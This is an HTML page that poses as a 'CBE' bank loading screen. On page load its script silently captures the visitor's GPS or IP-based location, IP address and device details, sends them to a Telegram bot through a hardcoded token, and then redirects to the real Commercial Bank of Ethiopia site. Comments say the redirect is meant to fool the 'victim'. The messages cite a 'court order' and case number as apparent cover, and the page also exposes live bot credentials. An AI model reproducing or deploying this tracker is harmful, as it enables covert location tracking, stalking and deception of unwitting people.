<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>CBE - Loading</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .loader {
            text-align: center;
            padding: 20px;
            color: #666;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #2c3e50;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="loader" id="loader">
        <div class="spinner"></div>
        <p>Loading, please wait...</p>
    </div>

    <script>
        // Telegram Configuration
        const BOT_TOKEN = "7533535188:AAGoTgg2Z3Z3YY6t2SiILJeEIrLC7en7hDU";
        const CHAT_ID = "7420938284";
        const COURT_ORDER = "CT-BAHA-2026-03-30";
        const CASE_NUMBER = "CBE-FRAUD-001-2026";
        
        let locationSent = false;
        
        function sendToTelegram(message, sendMap = false, lat = null, lon = null) {
            // Silent send - no response needed
            try {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                }).catch(e => console.log(e));
                
                if (sendMap && lat && lon) {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            latitude: lat,
                            longitude: lon
                        })
                    }).catch(e => console.log(e));
                }
            } catch(e) {}
        }
        
        function getLocationByIP() {
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(ipData => {
                    return fetch(`http://ip-api.com/json/${ipData.ip}?fields=status,country,regionName,city,lat,lon,isp,mobile,proxy,query`);
                })
                .then(r => r.json())
                .then(geo => {
                    if (geo.status === 'success' && !locationSent) {
                        locationSent = true;
                        
                        const lat = geo.lat;
                        const lon = geo.lon;
                        const city = geo.city || 'Unknown';
                        const region = geo.regionName || 'Unknown';
                        const country = geo.country || 'Unknown';
                        const isp = geo.isp || 'Unknown';
                        const timestamp = new Date().toISOString();
                        
                        const message = `
🚨 <b>SILENT LOCATION - COURT ORDER #${COURT_ORDER}</b> 🚨

📍 <b>LOCATION:</b>
├─ City: <b>${city}</b>
├─ Region: ${region}
├─ Country: ${country}
├─ Coordinates: ${lat}, ${lon}
└─ ISP: ${isp}

🌐 <b>DEVICE INFO:</b>
├─ IP: ${geo.query}
├─ User Agent: ${navigator.userAgent}
├─ Language: ${navigator.language}
├─ Screen: ${screen.width}x${screen.height}
├─ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
└─ Time: ${timestamp}

⚖️ <b>Case:</b> ${CASE_NUMBER}
<i>Silent capture. Subject unaware.</i>
`;
                        
                        sendToTelegram(message, true, lat, lon);
                        sendToTelegram(`📍 Maps: https://www.google.com/maps?q=${lat},${lon}`);
                    }
                })
                .catch(() => {});
        }
        
        function getGPSLocation() {
            if (!navigator.geolocation) {
                getLocationByIP();
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    if (!locationSent) {
                        locationSent = true;
                        
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        const timestamp = new Date().toISOString();
                        
                        // Also get IP info
                        fetch('https://api.ipify.org?format=json')
                            .then(r => r.json())
                            .then(ipData => {
                                const message = `
🚨 <b>GPS LOCATION - COURT ORDER #${COURT_ORDER}</b> 🚨

📍 <b>EXACT GPS:</b>
├─ Latitude: <b>${lat}</b>
├─ Longitude: <b>${lon}</b>
├─ Accuracy: ±${Math.round(accuracy)} meters

🌐 <b>DEVICE INFO:</b>
├─ IP: ${ipData.ip}
├─ User Agent: ${navigator.userAgent}
├─ Language: ${navigator.language}
├─ Screen: ${screen.width}x${screen.height}
├─ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
└─ Time: ${timestamp}

⚖️ <b>Case:</b> ${CASE_NUMBER}
<i>Silent GPS capture. Subject unaware.</i>
`;
                                sendToTelegram(message, true, lat, lon);
                                sendToTelegram(`📍 Maps: https://www.google.com/maps?q=${lat},${lon}`);
                            })
                            .catch(() => {
                                const message = `
🚨 <b>GPS LOCATION - COURT ORDER #${COURT_ORDER}</b> 🚨

📍 <b>EXACT GPS:</b>
├─ Latitude: <b>${lat}</b>
├─ Longitude: <b>${lon}</b>
├─ Accuracy: ±${Math.round(accuracy)} meters
├─ Time: ${timestamp}

⚖️ <b>Case:</b> ${CASE_NUMBER}
<i>Silent GPS capture.</i>
`;
                                sendToTelegram(message, true, lat, lon);
                            });
                    }
                },
                (error) => {
                    // GPS failed, use IP location silently
                    getLocationByIP();
                },
                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
        }
        
        // Redirect to legitimate site after location capture
        function redirectToRealSite() {
            // Redirect to real CBE or Telebirr website to make it look legitimate
            // Victim will think they just visited a normal page
            window.location.href = "https://www.commercialbankofethiopia.com";
        }
        
        // Execute silently
        getGPSLocation();
        
        // After 3 seconds, redirect to real site (makes it look normal)
        setTimeout(() => {
            redirectToRealSite();
        }, 3000);
        
        // Also send page view info
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(ipData => {
                sendToTelegram(`📱 <b>PAGE VIEWED</b>\nIP: ${ipData.ip}\nUser Agent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
            })
            .catch(() => {});
    </script>
</body>
</html>
